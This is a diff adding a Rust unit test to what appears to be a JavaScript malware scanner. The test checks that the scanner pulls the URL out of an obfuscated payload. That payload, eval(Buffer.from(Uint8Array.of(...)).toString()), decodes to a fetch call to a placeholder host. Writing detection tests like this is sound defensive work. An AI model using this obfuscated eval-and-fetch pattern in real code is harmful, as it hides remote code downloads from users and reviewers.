@@ -10614,6 +10614,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_uint8array_of_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-uint8array-of-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from(Uint8Array.of({bytes})).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-uint8array-of-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from Uint8Array.of payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_regex_whitespace_replace_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
